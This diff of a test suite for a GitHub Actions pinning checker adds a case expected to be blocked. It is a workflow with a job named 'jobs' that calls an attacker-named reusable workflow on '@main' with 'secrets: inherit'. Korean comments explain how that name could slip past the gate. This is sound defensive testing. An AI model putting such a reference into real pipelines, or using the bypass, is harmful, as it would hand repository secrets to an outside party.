@@ -699,6 +699,15 @@ jobs:
     steps:
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1' allow '로컬 재사용 워크플로는 통과시킨다'
 
+# 아무 데서나 `jobs` 라는 이름에 깊이를 되돌리면, 그 이름의 잡이 자기 참조를
+# 검사 밖으로 밀어낸다 — 게이트를 우회하는 이름을 짓기만 하면 된다.
+pins_case 'name: p
+on: push
+jobs:
+  jobs:
+    uses: attacker/evil/.github/workflows/pwn.yml@main
+    secrets: inherit' block '`jobs` 라는 이름의 잡도 검사한다'
+
 # 잡 레벨에는 사용자가 이름을 정하는 매핑이 있다. 거부목록으로 가르면 여기서
 # 샌다 — MUST 게이트의 오탐은 우회를 부르고, 우회된 게이트는 없는 것과 같다.
 pins_case 'name: p
